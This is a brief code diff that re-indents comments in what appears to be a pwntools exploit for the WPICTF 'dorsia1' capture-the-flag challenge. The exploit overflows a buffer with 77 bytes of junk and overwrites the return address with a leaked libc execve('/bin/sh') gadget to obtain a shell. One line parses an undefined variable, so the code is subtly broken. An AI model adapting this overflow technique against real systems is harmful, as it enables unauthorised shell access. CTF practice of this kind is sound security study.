@@ -4,17 +4,17 @@ class DorsiaExploit:
 
 	def levelone(self):
   
-    # Create data to fill the buffer
+    		# Create data to fill the buffer
 		JUNK = 'A' * 77
     
-    # Connect to the server
+    		# Connect to the server
 		r = remote('dorsia1.wpictf.xyz', 31337)
 
-    # Retrieve infoleak of execve('/bin/sh',NULL,NULL) gadget from libc system()
+    		# Retrieve infoleak of execve('/bin/sh',NULL,NULL) gadget from libc system()
 		infoleak_libc_system_gadget = r.recvline()
 		infoleak_libc_system_gadget = int(str(msg), 16)
 
-    # Add the junk to the buffer
+    		# Add the junk to the buffer
 		PAYLOAD = JUNK
 		PAYLOAD += p64(infoleak_libc_system_gadget) # Overwrite return address with gadget
     
